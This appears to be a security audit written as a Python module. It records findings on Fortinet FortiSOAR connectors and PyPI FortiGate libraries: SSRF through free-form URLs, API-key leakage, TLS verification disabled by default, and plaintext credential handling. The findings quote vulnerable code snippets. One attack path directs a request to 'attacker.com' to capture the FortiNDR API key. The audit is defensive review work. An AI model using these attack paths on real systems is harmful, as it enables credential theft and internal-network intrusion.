"""
Fortinet FortiNDR Cloud + FortiSandbox FortiSOAR connectors + PyPI libraries RE
Sources:
  - connector-fortinet-fortindr-cloud/fortinet-fortindr-cloud/operations.py
  - connector-fortinet-fortisandbox/fortinet-fortisandbox/utils.py + operations.py
  - pypi-packages/PyFortiAPI-0.3.0 (pyfortiapi.py)
  - pypi-packages/fortigate_api-2.0.8 (fortigate_base.py)
Products: FortiNDR Cloud, FortiSandbox, FortiOS
"""

# ---------------------------------------------------------
# Architecture summary
# ---------------------------------------------------------
ARCHITECTURE = {
    "fortindr_cloud_connector": {
        "package":   "connector-fortinet-fortindr-cloud (FortiSOAR connector)",
        "auth":      "IBToken API key in Authorization header",
        "endpoints": "US/EU region constants + execute_an_api_call free-form URL",
        "cloud_regions": ["US_Sensors", "US_Detection", "EU_Sensors", "EU_Detection"],
        "key_ops":   ["get_pcap_tasks", "get_detections", "get_entity_tracking",
                      "execute_an_api_call", "add_annotation"],
    },
    "fortisandbox_connector": {
        "package":   "connector-fortinet-fortisandbox (FortiSOAR connector)",
        "auth":      "OnPremise: username/passwd JSON RPC; Cloud: api_token",
        "protocol":  "JSON RPC over HTTPS (/jsonrpc endpoint)",
        "key_ops":   ["submit_file", "submit_urlfile", "get_url_rating", "get_file_rating"],
    },
    "pyfortiapi": {
        "package":   "PyFortiAPI v0.3.0 (pypi)",
        "auth":      "Form POST username=<u>&secretkey=<p>; CSRF token from cookie",
        "verify_default": False,
        "target":    "FortiGate REST API (cmdb, monitor, log)",
    },
    "fortigate_api": {
        "package":   "fortigate_api v2.0.8 (pypi)",
        "auth":      "Token (Bearer header) or username+password (form POST)",
        "verify_default": False,
        "target":    "FortiGate REST API (cmdb resources: firewall, router, system, vpn)",
    },
}


# ---------------------------------------------------------
# FFNDR-F01: FortiNDR Cloud connector -- execute_an_api_call SSRF + API key exfiltration
# ---------------------------------------------------------
FFNDR_F01_EXECUTE_SSRF = {
    "id":       "FFNDR-F01",
    "product":  "FortiNDR Cloud via FortiSOAR connector (connector-fortinet-fortindr-cloud)",
    "severity": "HIGH -- execute_an_api_call sends full user-controlled URL with API key; SSRF + credential exfiltration",
    "class":    "Server-Side Request Forgery with credential leakage (CWE-918, CWE-522)",

    "description": (
        "execute_an_api_call (operations.py): "
        "endpoint = params.get('endpoint'); "
        "http_method = params.get('method'); "
        "response = requests.request(method=http_method, url=endpoint, headers=headers, ...). "
        "The endpoint parameter is the full URL with no validation or allowlist check. "
        "The headers dict always includes: {'Authorization': 'IBToken ' + ndr.api_key}. "
        "An attacker who controls a FortiSOAR playbook or injects params can: "
        "(1) Direct the request to an internal host (SSRF) -- FortiSOAR often has internal network access. "
        "(2) Direct the request to an attacker-controlled external URL -- the IBToken API key is sent in "
        "the Authorization header, exfiltrating the FortiNDR Cloud credential to the attacker. "
        "The verify_ssl parameter on the FortiNDR object is propagated from config -- "
        "if verify_ssl=False (common in enterprise deployments), MITM interception is trivial. "
        "This is the same free-form URL pattern as FFSR-F01 (FortiSOAR FortiManager connector) "
        "and FFMG-MCP-F01 (fortimanager-mcp)."
    ),

    "vulnerable_code": (
        "endpoint = params.get('endpoint')  # full URL, no validation\n"
        "headers = {'Content-Type': 'application/json', 'Authorization': 'IBToken ' + ndr.api_key}\n"
        "response = requests.request(method=http_method, url=endpoint, headers=headers,\n"
        "                            data=payload, params=query_params, verify=ndr.verify_ssl)"
    ),

    "attack_path": (
        "FortiSOAR playbook with action=execute_an_api_call, "
        "params={endpoint: 'http://attacker.com/capture', method: 'GET'} "
        "-> FortiSOAR sends GET http://attacker.com/capture with "
        "Authorization: IBToken <api_key> -> attacker receives FortiNDR Cloud API key."
    ),

    "parallel_to": ["FFSR-F01 (FortiSOAR FortiManager connector free_form)", "FFMG-MCP-F01 (fortimanager-mcp)"],
}

FFNDR_F02_ENTITY_PATH_INJECTION = {
    "id":       "FFNDR-F02",
    "product":  "FortiNDR Cloud via FortiSOAR connector (connector-fortinet-fortindr-cloud)",
    "severity": "LOW -- entity_value/entity embedded unsanitized in URL path; potential API path traversal",
    "class":    "Unsanitized user input in URL path segment (CWE-22 risk surface)",

    "description": (
        "get_entity_tracking: "
        "endpoint = cloud_region + 'tracking/ip/{0}'.format(entity_value) -- no URL encoding. "
        "get_entity_summary: "
        "endpoint = cloud_region + '{0}/summary'.format(params.get('entity')). "
        "get_entity_pdns: "
        "endpoint = cloud_region + '{0}/pdns'.format(params.pop('entity')). "
        "entity_value and entity are from FortiSOAR playbook params; no sanitization applied. "
        "A value like '../admin/users' would produce: <cloud_region>tracking/ip/../admin/users -- "
        "path traversal on the FortiNDR Cloud API depending on server-side path normalization. "
        "Requests lib does not normalize '../' in URLs before sending."
    ),

    "vulnerable_code": (
        "endpoint = cloud_region + 'tracking/ip/{0}'.format(entity_value)  # no encoding\n"
        "endpoint = cloud_region + '{0}/summary'.format(params.get('entity'))  # no encoding"
    ),

    "exploitability_note": (
        "Requires FortiNDR Cloud API to normalize paths and serve a different endpoint. "
        "FortiNDR Cloud is a SaaS; path traversal is SaaS-server-dependent. "
        "Risk is primarily against on-premise NDR deployments or if FortiNDR Cloud API normalizes paths."
    ),
}


# ---------------------------------------------------------
# FFSB-F01: FortiSandbox connector -- OnPremise login sends passwd plaintext in JSON body
# ---------------------------------------------------------
FFSB_F01_PASSWD_JSON = {
    "id":       "FFSB-F01",
    "product":  "FortiSandbox via FortiSOAR connector (connector-fortinet-fortisandbox)",
    "severity": "MEDIUM -- OnPremise login sends passwd in plaintext JSON body to /jsonrpc",
    "class":    "Credential in plaintext request body (CWE-312)",

    "description": (
        "FortiSandbox.login() in utils.py: "
        "login_input['params'][0]['data'] = [{'user': self.username, 'passwd': self.password}]. "
        "_handle_post(login_input) -> POST self.base_url JSON {params:[{data:[{user:..., passwd:...}]}]}. "
        "The raw password is embedded in the JSON RPC body. "
        "If TLS is terminated by an intermediate proxy or verify_ssl=False, "
        "the password is visible in plaintext. "
        "Password stored in self.password for the object lifetime -- available in process memory "
        "for the duration of any playbook execution. "
        "Pattern identical to FFAZ-F01 (FortiAnalyzer Go SDK) and standard FortiManager JSON RPC login."
    ),

    "credential_lifecycle": (
        "Config dict -> FortiSandbox.__init__ -> self.password = config.get('password') "
        "-> self.login() -> JSON body -> POST /jsonrpc -> session_id returned. "
        "Password held in self.password for object lifetime."
    ),
}

FFSB_F02_URL_SSRF = {
    "id":       "FFSB-F02",
    "product":  "FortiSandbox via FortiSOAR connector (connector-fortinet-fortisandbox)",
    "severity": "MEDIUM -- FortiSandbox submit_urlfile/get_url_rating trigger FortiSandbox to fetch user-controlled URL",
    "class":    "Server-Side Request Forgery via sandbox URL analysis (CWE-918)",

    "description": (
        "submit_urlfile (operations.py): "
        "test_input['params'][0]['address'] = params['url']; POST /jsonrpc. "
        "get_url_rating: test_input['params'][0]['address'] = params['url']. "
        "FortiSandbox receives the URL and fetches it for analysis -- FortiSandbox IS the SSRF proxy. "
        "FortiSandbox deployments typically sit on internal networks with access to internal services. "
        "An attacker who controls a FortiSOAR playbook can submit http://internal-server:port/path "
        "as the analysis URL; FortiSandbox fetches it and reports the response back to FortiSOAR. "
        "The QUERY_SCHEMA template for file_upload_url includes 'depth': '1' -- FortiSandbox follows "
        "one redirect level. This enables redirect-based SSRF pivots. "
        "Impact: FortiSandbox-to-internal-network SSRF via FortiSOAR-controlled URL submission."
    ),

    "vulnerable_code": (
        "def submit_urlfile(config, params):\n"
        "    ...\n"
        "    test_input = QUERY_SCHEMA.get('file_upload_url')\n"
        "    urls = params['url']  # user-controlled\n"
        "    test_input['params'][0]['address'] = urls  # FortiSandbox fetches this URL"
    ),

    "ssrf_target": (
        "FortiSandbox fetches the submitted URL from its deployment network. "
        "Typical access: internal management networks, adjacent segments in DMZ, cloud internal VPCs. "
        "Result (scan report) returned to FortiSOAR caller."
    ),
}


# ---------------------------------------------------------
# FPYFA-F01: PyFortiAPI -- verify=False default; process-wide TLS warning suppression
# ---------------------------------------------------------
FPYFA_F01_TLS_BYPASS = {
    "id":       "FPYFA-F01",
    "product":  "PyFortiAPI v0.3.0 (PyPI library)",
    "severity": "MEDIUM -- verify=False default; process-wide InsecureRequestWarning suppression; MITM trivial",
    "class":    "TLS validation disabled by default; process-wide warning suppression (CWE-295)",

    "description": (
        "FortiGate.__init__(self, ipaddr, username, password, timeout=10, vdom='root', port='443', verify=False): "
        "verify defaults to False -- all TLS connections accept any certificate. "
        "login(): if not self.verify: requests.packages.urllib3.disable_warnings(InsecureRequestWarning). "
        "This suppresses urllib3 TLS warnings PROCESS-WIDE -- any other code sharing the same Python "
        "process also loses SSL validation warnings. "
        "Credentials sent via form POST: data='username={username}&secretkey={password}'. "
        "With verify=False, a MITM attacker intercepts the login POST and captures the password. "
        "Default False means any code using PyFortiAPI without explicitly setting verify=True "
        "communicates with no TLS validation -- the same class of error as FortiSOAR (disable_request_warnings=True)."
    ),

    "vulnerable_code": (
        "def __init__(self, ipaddr, username, password, ..., verify=False):\n"
        "    self.verify = verify  # False by default\n"
        "...\n"
        "def login(self):\n"
        "    if not self.verify:\n"
        "        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # process-wide"
    ),
}

FPYFA_F02_LOGIN_CREDENTIALS_FORM = {
    "id":       "FPYFA-F02",
    "product":  "PyFortiAPI v0.3.0 (PyPI library)",
    "severity": "LOW -- login() sends plaintext credentials as form body; held in self.password for object lifetime",
    "class":    "Credential in request body + long-lived object memory (CWE-312)",

    "description": (
        "login(): session.post(url, data='username={username}&secretkey={password}'.format(...). "
        "The password is URL-encoded and sent as form body to the FortiGate login endpoint. "
        "self.password is stored on the FortiGate instance for its lifetime -- any code with "
        "access to the instance can read the plaintext password. "
        "Combined with FPYFA-F01 (verify=False default + TLS warning suppression), "
        "MITM intercept of the form POST yields cleartext credentials."
    ),
}


# ---------------------------------------------------------
# FFGA-F01: fortigate_api -- verify=False default; module-level TLS warning suppression
# ---------------------------------------------------------
FFGA_F01_TLS_BYPASS = {
    "id":       "FFGA-F01",
    "product":  "fortigate_api v2.0.8 (PyPI library)",
    "severity": "MEDIUM -- verify defaults to False (bool(None)=False); module-level urllib3 warning suppression",
    "class":    "TLS validation disabled by default; module-level warning suppression (CWE-295)",

    "description": (
        "fortigate_base.py line 20: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning). "
        "This executes at module import time -- importing fortigate_api silently disables "
        "urllib3 SSL warnings for the entire Python process. "
        "FortiGateBase.__init__: self.verify = bool(kwargs.get('verify')). "
        "bool(None) = False, bool(0) = False -- if the caller omits 'verify' or passes 0, "
        "verify is False and all TLS connections skip certificate validation. "
        "The pattern is worse than PyFortiAPI: suppression happens at import, not at login -- "
        "no TLS warnings from any urllib3 code in the process from the moment fortigate_api is imported."
    ),

    "vulnerable_code": (
        "# module level -- runs at import:\n"
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n"
        "...\n"
        "# constructor:\n"
        "self.verify: bool = bool(kwargs.get('verify'))  # bool(None) = False"
    ),

    "severity_rationale": (
        "PyFortiAPI only suppresses on login() call. "
        "fortigate_api suppresses at import -- earlier, unavoidable once the module is imported. "
        "Both set verify=False default."
    ),
}

FFGA_F02_PASSWORD_FORM_LOGIN = {
    "id":       "FFGA-F02",
    "product":  "fortigate_api v2.0.8 (PyPI library)",
    "severity": "LOW -- login() sends password in URL-encoded form body; self.password stored object lifetime",
    "class":    "Credential in request body + long-lived object memory (CWE-312)",

    "description": (
        "FortiGateBase.login() (fortigate_base.py): "
        "response = session.post(..., data=urlencode([('username', self.username), ('secretkey', self.password)]), ...). "
        "self.password = str(kwargs.get('password')) -- str() ensures None is converted to 'None', "
        "not raising an error, which means a caller who passes no password silently authenticates "
        "with literal string 'None' as the password. "
        "This could cause unexpected auth failures rather than raising an error, "
        "but does not create a security bypass. "
        "The primary issue is identical to FPYFA-F02: cleartext credential in form body + verify=False default."
    ),

    "note_on_none_password": (
        "self.password = str(kwargs.get('password')) -- str(None) = 'None'. "
        "If a caller omits the password kwarg, the login attempt uses 'None' as the secretkey. "
        "Unexpected silent auth failure rather than error."
    ),
}


# ---------------------------------------------------------
# Cross-library systemic analysis
# ---------------------------------------------------------
PYPI_FORTINET_SYSTEMIC = {
    "id":       "FPYPI-SYSTEMIC",
    "product":  "PyFortiAPI v0.3.0 + fortigate_api v2.0.8 (PyPI libraries)",
    "severity": "HIGH -- both public PyPI FortiGate libraries disable TLS validation by default; affects all dependent projects",
    "class":    "Systemic: PyPI library ecosystem defaults to insecure TLS posture for FortiGate access",

    "pattern": (
        "Both libraries distributed on PyPI make the same design choice: "
        "(1) Default verify=False -- TLS validation disabled unless caller explicitly opts in. "
        "(2) Process-wide urllib3 InsecureRequestWarning suppression -- warnings silenced. "
        "The combination means: any project that pip installs either library and instantiates "
        "the client without explicit verify=True communicates over unvalidated TLS with no warning. "
        "The Fortinet ecosystem creates a consistent pattern across SDK layers: "
        "fortigate_api (PyPI) -> verify=False default + module-level warning suppression, "
        "PyFortiAPI (PyPI) -> verify=False default + login-time warning suppression, "
        "forti-sdk-go (Go) -> no analog (Go does not suppress TLS errors by default), "
        "FortiSOAR connector -> disable_request_warnings=True (process-wide)."
    ),

    "combined_risk": (
        "An adversary positioned between the client and FortiGate (on the same LAN, "
        "in the same cloud VPC, or via ARP poisoning) intercepts all API calls "
        "including admin credential form POSTs -- no warning raised, no error thrown."
    ),
}

FORTINDR_FORTISANDBOX_ECOSYSTEM = {
    "id":       "FCONNECTORS-SYSTEMIC",
    "product":  "FortiNDR Cloud + FortiSandbox FortiSOAR connectors",
    "severity": "HIGH -- same free-form URL pattern as FortiManager connector; SSRF in FortiNDR; indirect SSRF in FortiSandbox",
    "class":    "Systemic: FortiSOAR connector pattern enables SSRF via unconstrained URL parameters",

    "pattern": (
        "The FortiSOAR connector ecosystem repeats the free-form URL pattern: "
        "FortiManager (FFSR-F01): free_form action -> url from params, no restriction. "
        "FortiNDR Cloud (FFNDR-F01): execute_an_api_call -> endpoint from params, no restriction. "
        "FortiSandbox (FFSB-F02): submit_urlfile -> url from params -> FortiSandbox fetches it (proxy SSRF). "
        "This is a FortiSOAR connector design pattern, not a per-product bug: "
        "the 'execute arbitrary API call' action type enables SSRF by design in every connector that implements it. "
        "The FortiNDR case is worse because the API key is in the Authorization header -- "
        "directing the URL to an attacker endpoint exfiltrates the credential in the same request."
    ),
}
